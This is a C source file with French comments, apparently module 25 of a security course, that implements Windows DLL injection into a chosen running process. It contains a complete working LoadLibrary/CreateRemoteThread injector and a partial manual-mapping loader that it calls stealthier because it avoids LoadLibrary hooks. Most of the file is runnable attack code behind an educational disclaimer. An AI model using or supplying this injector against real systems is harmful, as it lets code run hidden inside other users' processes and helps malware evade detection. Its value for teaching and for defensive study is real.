/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                    MODULE 25 : DLL INJECTION
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * AVERTISSEMENT LÉGAL CRITIQUE :
 * Ce code est fourni UNIQUEMENT à des fins éducatives pour la cybersécurité.
 * L'injection de DLL sans autorisation est ILLÉGALE et PUNISSABLE.
 *
 * Utilisez UNIQUEMENT dans :
 *   - Environnements de test isolés (VM déconnectées)
 *   - Contexte de red teaming autorisé par écrit
 *   - Recherche académique légitime
 *   - Développement d'outils de sécurité autorisés
 *
 * Toute utilisation malveillante est strictement interdite.
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifdef _WIN32

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         UTILITAIRES PROCESS
 * ═══════════════════════════════════════════════════════════════════════════
 */

/**
 * Trouve le PID d'un processus par son nom
 */
DWORD find_process_by_name(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *              TECHNIQUE 1 : CLASSIC DLL INJECTION (LoadLibrary)
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Méthode classique d'injection de DLL :
 * 1. Allouer de la mémoire dans le processus cible pour le chemin de la DLL
 * 2. Écrire le chemin complet de la DLL dans cette mémoire
 * 3. Résoudre l'adresse de LoadLibraryA dans kernel32.dll
 * 4. Créer un thread distant avec LoadLibraryA comme start routine
 * 5. Le thread appelle LoadLibraryA(dll_path), chargeant la DLL
 */

BOOL inject_dll_loadlibrary(DWORD pid, const char* dll_path) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TECHNIQUE 1 : Classic DLL Injection (LoadLibrary)\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    printf("[*] PID cible: %lu\n", pid);
    printf("[*] DLL à injecter: %s\n", dll_path);

    // Vérifier que le fichier DLL existe
    DWORD fileAttr = GetFileAttributesA(dll_path);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        printf("[-] La DLL n'existe pas: %s\n", dll_path);
        printf("[*] Créez d'abord la DLL avec: gcc -shared -o test.dll test_dll.c\n");
        return FALSE;
    }

    // Étape 1: Ouvrir le processus cible
    printf("\n[1/5] Ouverture du processus...\n");
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Handle du processus: 0x%p\n", hProcess);

    // Étape 2: Allouer de la mémoire pour le chemin de la DLL
    printf("\n[2/5] Allocation de mémoire pour le chemin de la DLL...\n");
    SIZE_T dll_path_size = strlen(dll_path) + 1;

    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        dll_path_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Mémoire allouée à: 0x%p (%zu bytes)\n", remoteBuffer, dll_path_size);

    // Étape 3: Écrire le chemin de la DLL dans la mémoire distante
    printf("\n[3/5] Écriture du chemin de la DLL...\n");
    SIZE_T bytesWritten = 0;

    if (!WriteProcessMemory(hProcess, remoteBuffer, dll_path, dll_path_size, &bytesWritten)) {
        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] %zu bytes écrits: \"%s\"\n", bytesWritten, dll_path);

    // Étape 4: Résoudre l'adresse de LoadLibraryA
    printf("\n[4/5] Résolution de LoadLibraryA...\n");

    // kernel32.dll est chargé à la même adresse dans tous les processus (normalement)
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

    if (pLoadLibraryA == NULL) {
        printf("[-] Impossible de trouver LoadLibraryA\n");
        goto cleanup;
    }
    printf("[+] LoadLibraryA à: 0x%p\n", pLoadLibraryA);

    // Étape 5: Créer un thread distant pour charger la DLL
    printf("\n[5/5] Création du thread distant...\n");
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,  // Start routine = LoadLibraryA
        remoteBuffer,                            // Paramètre = chemin de la DLL
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] Erreur CreateRemoteThread: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Thread créé! Handle: 0x%p\n", hThread);

    // Attendre que LoadLibrary termine
    printf("\n[*] Attente du chargement de la DLL...\n");
    WaitForSingleObject(hThread, INFINITE);

    // Vérifier le code de retour (HMODULE de la DLL chargée)
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    if (exitCode == 0) {
        printf("[-] LoadLibrary a échoué (retour NULL)\n");
        printf("[*] La DLL a probablement été bloquée ou a crashé\n");
    } else {
        printf("[+] DLL chargée avec succès! HMODULE: 0x%lx\n", exitCode);
        success = TRUE;
    }

cleanup:
    if (hThread) CloseHandle(hThread);
    if (remoteBuffer) VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return success;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *              TECHNIQUE 2 : MANUAL MAPPING (sans LoadLibrary)
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Chargement manuel de DLL sans utiliser LoadLibrary :
 * - Parse du format PE de la DLL
 * - Copie manuelle des sections (.text, .data, .rdata, etc.)
 * - Résolution manuelle des imports (IAT)
 * - Application des relocations
 * - Appel manuel du DllMain
 *
 * Avantages :
 * - Évite les hooks sur LoadLibrary
 * - La DLL n'apparaît pas dans la liste PEB des modules
 * - Plus furtif que l'injection classique
 */

// Structure PE simplifiée (pour la démo)
typedef struct {
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    LPVOID imageBase;
    SIZE_T imageSize;
} PE_INFO;

/**
 * Parse les headers PE d'une DLL
 */
BOOL parse_pe_headers(const char* dll_path, PE_INFO* pe_info) {
    printf("\n[*] Parsing des headers PE...\n");

    // Lire le fichier DLL
    HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'ouvrir la DLL: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = malloc(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Vérifier le magic number DOS
    pe_info->dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    if (pe_info->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Fichier PE invalide (pas de signature MZ)\n");
        free(fileBuffer);
        return FALSE;
    }

    // Récupérer les headers NT
    pe_info->ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)fileBuffer + pe_info->dosHeader->e_lfanew);
    if (pe_info->ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Signature NT invalide\n");
        free(fileBuffer);
        return FALSE;
    }

    pe_info->imageBase = fileBuffer;
    pe_info->imageSize = pe_info->ntHeaders->OptionalHeader.SizeOfImage;

    printf("[+] PE parsé:\n");
    printf("    Signature: MZ + PE\n");
    printf("    Taille de l'image: %zu bytes\n", pe_info->imageSize);
    printf("    Point d'entrée: 0x%lx\n", pe_info->ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("    Nombre de sections: %d\n", pe_info->ntHeaders->FileHeader.NumberOfSections);

    return TRUE;
}

/**
 * Manual Mapping (version simplifiée pour démo)
 */
BOOL inject_dll_manual_mapping(DWORD pid, const char* dll_path) {
    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TECHNIQUE 2 : Manual Mapping (sans LoadLibrary)\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    printf("[*] Cette technique évite LoadLibrary pour être plus furtive\n");
    printf("[*] DLL: %s\n\n", dll_path);

    PE_INFO pe_info = {0};

    // Étape 1: Parser le PE
    if (!parse_pe_headers(dll_path, &pe_info)) {
        return FALSE;
    }

    // Étape 2: Ouvrir le processus
    printf("\n[2] Ouverture du processus PID=%lu...\n", pid);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        free(pe_info.imageBase);
        return FALSE;
    }

    // Étape 3: Allouer de la mémoire pour l'image complète
    printf("\n[3] Allocation de mémoire pour l'image (%zu bytes)...\n", pe_info.imageSize);
    LPVOID remoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        pe_info.imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteImage == NULL) {
        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
        CloseHandle(hProcess);
        free(pe_info.imageBase);
        return FALSE;
    }
    printf("[+] Image allouée à: 0x%p\n", remoteImage);

    // Étape 4: Copier les headers
    printf("\n[4] Copie des headers PE...\n");
    SIZE_T written;
    WriteProcessMemory(
        hProcess,
        remoteImage,
        pe_info.imageBase,
        pe_info.ntHeaders->OptionalHeader.SizeOfHeaders,
        &written
    );
    printf("[+] Headers copiés (%zu bytes)\n", written);

    // Étape 5: Copier chaque section
    printf("\n[5] Copie des sections:\n");
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pe_info.ntHeaders);

    for (int i = 0; i < pe_info.ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        printf("    [%d] %-8s : Offset 0x%08lx → RVA 0x%08lx (%lu bytes)\n",
               i,
               section->Name,
               section->PointerToRawData,
               section->VirtualAddress,
               section->SizeOfRawData);

        if (section->SizeOfRawData > 0) {
            WriteProcessMemory(
                hProcess,
                (LPBYTE)remoteImage + section->VirtualAddress,
                (LPBYTE)pe_info.imageBase + section->PointerToRawData,
                section->SizeOfRawData,
                &written
            );
        }
    }
    printf("[+] Toutes les sections copiées\n");

    printf("\n[*] Manual Mapping (version simplifiée) terminé\n");
    printf("[*] Dans une implémentation complète, il faudrait:\n");
    printf("    - Résoudre les imports (IAT)\n");
    printf("    - Appliquer les relocations\n");
    printf("    - Appeler DllMain manuellement\n");
    printf("    - Gérer les TLS callbacks\n");

    // Cleanup
    CloseHandle(hProcess);
    free(pe_info.imageBase);

    return TRUE;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         DÉMONSTRATIONS
 * ═══════════════════════════════════════════════════════════════════════════
 */

void demo_dll_injection(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║          MODULE 25 : DÉMONSTRATION DLL INJECTION             ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    printf("\n⚠️  AVERTISSEMENT ⚠️\n");
    printf("Ce code est à usage ÉDUCATIF UNIQUEMENT!\n");
    printf("L'injection de DLL sans autorisation est ILLÉGALE.\n\n");

    printf("INSTRUCTIONS:\n");
    printf("1. Créez une DLL de test (voir exercice.txt)\n");
    printf("2. Lancez un processus cible (ex: notepad.exe)\n");
    printf("3. Exécutez ce programme avec droits administrateur\n");
    printf("4. Sélectionnez la technique d'injection\n\n");

    // Demander le processus cible
    char processName[256];
    printf("Nom du processus cible (ex: notepad.exe): ");
    if (scanf("%255s", processName) != 1) {
        return;
    }

    DWORD pid = find_process_by_name(processName);
    if (pid == 0) {
        printf("[-] Processus non trouvé: %s\n", processName);
        return;
    }
    printf("[+] Processus trouvé - PID: %lu\n", pid);

    // Demander le chemin de la DLL
    char dll_path[MAX_PATH];
    printf("\nChemin complet de la DLL à injecter: ");
    if (scanf("%259s", dll_path) != 1) {
        return;
    }

    // Menu de sélection
    printf("\n[*] Sélectionnez la technique d'injection:\n");
    printf("1. Classic DLL Injection (LoadLibrary)\n");
    printf("2. Manual Mapping (sans LoadLibrary)\n");
    printf("Choix (1-2): ");

    int choice;
    if (scanf("%d", &choice) != 1) {
        return;
    }

    BOOL result = FALSE;

    switch (choice) {
        case 1:
            result = inject_dll_loadlibrary(pid, dll_path);
            break;
        case 2:
            result = inject_dll_manual_mapping(pid, dll_path);
            break;
        default:
            printf("[-] Choix invalide\n");
            return;
    }

    if (result) {
        printf("\n[✓] Injection réussie!\n");
        printf("[*] Vérifiez le processus cible pour confirmer l'injection\n");
    } else {
        printf("\n[✗] Injection échouée\n");
    }
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         FONCTION PRINCIPALE
 * ═══════════════════════════════════════════════════════════════════════════
 */

int main(void) {
    demo_dll_injection();
    printf("\n");
    return 0;
}

#else

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                      PLATEFORME NON-WINDOWS
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include <stdio.h>

int main(void) {
    printf("Ce module est spécifique à Windows.\n");
    printf("Compilez et exécutez sur un système Windows.\n");
    return 1;
}

#endif /* _WIN32 */
